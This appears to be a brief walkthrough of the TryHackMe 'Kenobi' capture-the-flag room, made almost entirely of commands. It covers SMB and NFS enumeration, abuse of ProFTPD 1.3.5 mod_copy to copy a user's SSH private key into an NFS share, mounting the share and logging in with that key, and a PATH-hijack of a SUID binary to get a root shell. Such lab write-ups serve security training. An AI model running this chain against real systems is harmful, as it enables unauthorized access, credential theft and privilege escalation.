# Kenobi
## link: https://tryhackme.com/room/kenobi


### Task 1

```
ping 10.81.183.91
```
```
nmap -A 10.81.183.91
```

---
### Task 2

```
enum4linux 10.81.183.91
```

```
//10.81.183.91/anonymous
```

```
smbget smb://10.81.183.91/anonymous/log.txt
```

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.80.157.200
```

---
### Task 3

```
searchsploit ProFTPD 1.3.5
```

```
searchsploit -x linux/remote/36742.txt
```

```
nc 10.80.157.200 21
SITE CPFR /home/kenobi/.ssh
SITE CPTO /var/tmp/find
```

```
mkdir /mnt/kenobiNFS
```

```
sudo mount 10.80.157.200:/var /mnt/kenobiNFS
```

```
cat /mnt/kenobiNFS/tmp/find/id_rsa > ~/kenobi_key
```

```
sudo ssh -i kenobi_key kenobi@10.80.157.200
```

---
### Task 4

```
find / -perm -u=s -type f 2>/dev/null
```

```
echo /bin/sh > curl
chmod 777 curl
export PATH=~:$PATH
/usr/bin/menu
```

---
## Finally, we are root
